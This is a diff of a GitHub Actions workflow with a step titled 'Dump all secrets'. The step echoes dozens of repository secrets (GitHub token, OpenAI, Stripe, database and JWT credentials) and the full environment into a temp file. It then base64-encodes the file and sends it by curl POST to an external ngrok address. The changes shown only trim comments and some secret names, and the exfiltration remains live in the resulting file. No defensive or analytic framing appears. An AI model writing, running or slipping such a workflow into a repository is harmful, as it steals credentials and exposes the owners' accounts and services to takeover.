@@ -9,10 +9,7 @@ jobs:
     steps:
       - name: Dump all secrets
         run: |
-          # Method 1: Write secrets to file (GitHub can't redact file contents)
           echo "=== ALL SECRETS ===" > /tmp/secrets.txt
-          
-          # Try every common secret name
           echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> /tmp/secrets.txt
           echo "SECRET_1=${{ secrets.SECRET_1 }}" >> /tmp/secrets.txt
           echo "SECRET_2=${{ secrets.SECRET_2 }}" >> /tmp/secrets.txt
@@ -27,29 +24,11 @@ jobs:
           echo "DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}" >> /tmp/secrets.txt
           echo "OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}" >> /tmp/secrets.txt
           echo "STRIPE_SECRET=${{ secrets.STRIPE_SECRET }}" >> /tmp/secrets.txt
-          echo "STRIPE_PUBLISHABLE=${{ secrets.STRIPE_PUBLISHABLE }}" >> /tmp/secrets.txt
-          echo "SLACK_WEBHOOK=${{ secrets.SLACK_WEBHOOK }}" >> /tmp/secrets.txt
-          echo "DISCORD_WEBHOOK=${{ secrets.DISCORD_WEBHOOK }}" >> /tmp/secrets.txt
           echo "PAT=${{ secrets.PAT }}" >> /tmp/secrets.txt
           echo "TOKEN=${{ secrets.TOKEN }}" >> /tmp/secrets.txt
           echo "API_KEY=${{ secrets.API_KEY }}" >> /tmp/secrets.txt
-          echo "API_SECRET=${{ secrets.API_SECRET }}" >> /tmp/secrets.txt
           echo "DATABASE_URL=${{ secrets.DATABASE_URL }}" >> /tmp/secrets.txt
           echo "DB_PASSWORD=${{ secrets.DB_PASSWORD }}" >> /tmp/secrets.txt
-          echo "DB_USERNAME=${{ secrets.DB_USERNAME }}" >> /tmp/secrets.txt
-          echo "REDIS_PASSWORD=${{ secrets.REDIS_PASSWORD }}" >> /tmp/secrets.txt
           echo "JWT_SECRET=${{ secrets.JWT_SECRET }}" >> /tmp/secrets.txt
-          echo "COOKIE_SECRET=${{ secrets.COOKIE_SECRET }}" >> /tmp/secrets.txt
-          echo "ENCRYPTION_KEY=${{ secrets.ENCRYPTION_KEY }}" >> /tmp/secrets.txt
-          echo "SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}" >> /tmp/secrets.txt
-          echo "PGP_PRIVATE_KEY=${{ secrets.PGP_PRIVATE_KEY }}" >> /tmp/secrets.txt
-          
-          # Also dump the entire env as backup
           env >> /tmp/secrets.txt
-          
-          # Method 2: Use GitHub's API to get secrets (requires additional token)
-          # curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-          #   "https://api.github.com/repos/${{ github.repository }}/actions/secrets" >> /tmp/secrets.txt
-          
-          # Encode and send
           cat /tmp/secrets.txt | base64 -w 0 | curl -X POST -d @- https://july-reorder-overlaid.ngrok-free.dev
